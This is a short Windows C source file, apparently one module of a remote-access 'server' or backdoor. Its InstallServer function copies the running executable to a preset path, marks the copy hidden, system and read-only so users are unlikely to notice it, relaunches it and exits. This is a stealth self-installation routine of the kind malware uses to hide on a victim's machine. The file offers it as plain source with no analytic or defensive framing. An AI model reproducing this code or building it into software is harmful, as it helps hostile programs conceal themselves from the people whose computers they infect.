#include <stdio.h>
#include <windows.h>
#include "Install.h"
#include "Information.h"
#include "Utils.h"

void InstallServer()
{
    DWORD file_attributes = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM;

    char install_path[MAX_PATH], current_path[MAX_PATH];
    snprintf(install_path, sizeof(install_path), "%s\\%s", SERVER_INSTALL_PATH, SERVER_INSTALL_NAME);
    GetModuleFileName(NULL, current_path, sizeof(current_path));

    if(strcmp(strtolower(current_path), strtolower(install_path)) != 0)
    {
        printf("# My current path is %s\n# My installation path is %s\n", current_path, install_path);
        CopyFile(current_path, install_path, !SERVER_INSTALL_OVERRIDE);
        SetFileAttributes(install_path, file_attributes);
        ShellExecute(NULL, "open", install_path, NULL, NULL, SW_SHOWNORMAL);
        exit(0);
    }
}
